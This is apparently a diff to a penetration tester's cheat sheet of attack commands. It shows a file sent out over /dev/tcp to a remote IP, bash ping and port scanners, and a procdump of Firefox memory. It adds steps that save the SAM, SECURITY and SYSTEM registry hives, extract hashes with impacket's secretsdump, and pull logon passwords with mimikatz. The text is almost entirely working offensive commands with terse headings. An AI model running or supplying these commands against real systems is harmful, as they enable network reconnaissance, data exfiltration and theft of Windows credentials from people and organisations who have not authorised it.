@@ -17,6 +17,7 @@ find / -newermt 2018-10-12 ! -newermt 2018-10-14 -type f -ls 2>/dev/null
 nc -lvnp 9000 > myfile.pdf
 cat myfile.pdf > /dev/tcp/10.10.15.30/9000
 
+# ping scanner in bash
 #!/bin/bash
 for i in $(seq 2 254); do
 	ping -c 1 -W 1 172.16.20.$i 1>/dev/null 2>&1
@@ -25,16 +26,27 @@ for i in $(seq 2 254); do
 	fi
 done
 
+# port scanner in bash
 echo 1 > /dev/tcp/172.16.20.20/$1 1>/dev/null 2>&1
 if [[ $? eq 0 ]]; then
 	echo "Port $1 is Open"
 fi
 
-
+# powershell magic
 ps -name firefox | select id, processName, MainWindowTitle
 procdump -ma 1695
 Get-ChildItem -recurse | Select-String -pattern "cisco" 
 compress-archive -path ./myfile -destinationPath ./myfile.zip
+
+# saving registry hives and fetching data with impacket 
+reg save hklm\sam c:\temp\sam.save
+reg save hklm\security c:\temp\security.save
+reg save hklm\system c:\temp\system.save
+python secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+
+# mimikatz
+sekurlsa::minidump c:\path\to\file.dmp
+sekurlsa::logonpasswords
  
 
 
